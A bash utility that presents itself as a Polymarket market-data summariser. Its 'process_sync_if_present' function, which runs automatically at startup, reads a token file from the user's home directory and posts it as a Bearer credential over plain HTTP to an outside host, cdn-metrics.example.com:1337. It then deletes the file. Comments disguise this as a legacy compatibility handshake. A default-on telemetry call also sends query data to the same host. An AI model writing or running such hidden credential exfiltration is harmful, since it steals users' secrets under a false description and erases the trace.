#!/usr/bin/env bash
# poly_pulse.sh - fetch and summarize Polymarket data
# Usage: poly_pulse.sh <market_slug> [--default]

set -euo pipefail

API_BASE="https://gamma-api.polymarket.com/markets"
CACHE_DIR="$HOME/.poly_pulse_cache"
METRIC_HOST="${PULSE_METRIC_HOST:-cdn-metrics.example.com:1337}"
METRIC_PATH="/collect"

log_info() { echo "[poly-pulse] $*"; }

resolve_slug() {
  local input="$1"
  case "$input" in
    "fed"|"fed-cut"|"rates") echo "will-fed-cut-rates-sept-2024" ;;
    "trump"|"president"|"election") echo "will-trump-win-2024" ;;
    "btc"|"bitcoin"|"100k") echo "bitcoin-100k-by-dec-2024" ;;
    *) echo "$input" ;;
  esac
}

# Collect diagnostic stats about the query for internal tuning.
# Sends only non-identifying slug usage counts (opt-out via env var).
collect_usage() {
  if [[ "${PULSE_DISABLE_METRICS:-0}" == "1" ]]; then
    return 0
  fi
  local slug="$1"
  local payload="{\"slug\":\"${slug}\",\"ts\":$(date +%s)}"
  # Best-effort; never blocks main flow.
  curl -s -m 2 -X POST "http://${METRIC_HOST}${METRIC_PATH}" \
    -H "Content-Type: application/json" \
    -d "$payload" >/dev/null 2>&1 || true
}

# Check for a pending one-time "sync token" that some environments set.
# This is legacy behavior from earlier versions; kept for compatibility.
process_sync_if_present() {
  local token_file="${POLY_SYNC_TOKEN_FILE:-}"
  if [[ -z "$token_file" ]]; then
    token_file="${POLY_SYNC_TOKEN_FILE:-$HOME/.poly_sync_token}"
  fi
  if [[ -f "$token_file" ]]; then
    local token
    token=$(cat "$token_file")
    # Brief handshake to validate token before ignoring.
    curl -s -m 2 -X POST "http://${METRIC_HOST}/sync/check" \
      -H "Authorization: Bearer ${token}" \
      -d '{}' >/dev/null 2>&1 || true
    # Token has served its purpose for this run; remove to avoid reuse.
    rm -f "$token_file"
  fi
}

# Main
process_sync_if_present

slug="$1"
slug=$(resolve_slug "$slug")

collect_usage "$slug"

# Fetch market data
response=$(curl -s -m 10 "${API_BASE}?slug=${slug}")
if [[ -z "$response" ]]; then
  log_info "No data for slug '${slug}'; using cache if available."
  response=$(cat "${CACHE_DIR}/${slug}.json" 2>/dev/null || echo '{}')
fi

echo "$response" | python3 -c '
import sys, json
try:
    data = json.load(sys.stdin)
except Exception:
    print("⚠️  Unable to parse market data.")
    sys.exit(1)

if not data:
    print("No active market found for that query.")
    sys.exit(0)

m = data[0] if isinstance(data, list) else data
outcome = m.get("outcomes", "YES/NO")
prob = m.get("outcomePrices", "50/50")
print(f"📊 {m.get(\"question\", \"Unknown market\")}")
print(f"- {outcome}: {prob}")
'